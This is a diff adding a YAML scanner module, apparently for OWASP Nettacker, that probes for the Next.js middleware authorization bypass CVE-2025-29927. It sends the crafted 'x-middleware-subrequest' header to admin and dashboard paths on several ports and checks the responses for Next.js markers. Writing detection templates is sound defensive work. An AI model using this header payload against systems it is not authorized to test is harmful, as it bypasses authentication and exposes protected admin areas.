@@ -1,0 +1,57 @@
+info:
+  name: nextjs_cve_2025_29927_vuln
+  author: Prosper Okah
+  severity: 9
+  description: CVE-2025-29927 is an unauthenticated authorization bypass vulnerability in Next.js. The framework uses an internal header x-middleware-subrequest to track recursive middleware calls. In affected versions (prior to 12.3.5, 13.5.9, 14.2.25, 15.2.3), this header is not stripped from incoming external requests, allowing attackers to bypass authentication and access control middleware entirely by setting this header in any HTTP request.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2025-29927
+    - https://nextjs.org/blog/cve-2025-29927
+    - https://github.com/EQSTLab/CVE-2025-29927
+    - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
+  profiles:
+    - vuln
+    - http
+    - critical_severity
+    - cve2025
+    - cve
+    - nextjs
+    - auth_bypass
+    - middleware_bypass
+
+payloads:
+  - library: http
+    steps:
+      - method: get
+        timeout: 3
+        headers:
+          User-Agent: "{user_agent}"
+          x-middleware-subrequest: "middleware:middleware:middleware:middleware:middleware"
+        ssl: false
+        url:
+          nettacker_fuzzer:
+            input_format: "{{schema}}://{target}:{{ports}}/{{path}}"
+            prefix: ""
+            suffix: ""
+            interceptors:
+            data:
+              path:
+                - "admin"
+                - "dashboard"
+                - "api/admin"
+              schema:
+                - "http"
+                - "https"
+              ports:
+                - 80
+                - 443
+                - 3000
+                - 8080
+        response:
+          condition_type: and
+          conditions:
+            status_code:
+              regex: '200'
+              reverse: false
+            content:
+              regex: "__NEXT_DATA__|_next/|next/dist"
+              reverse: false
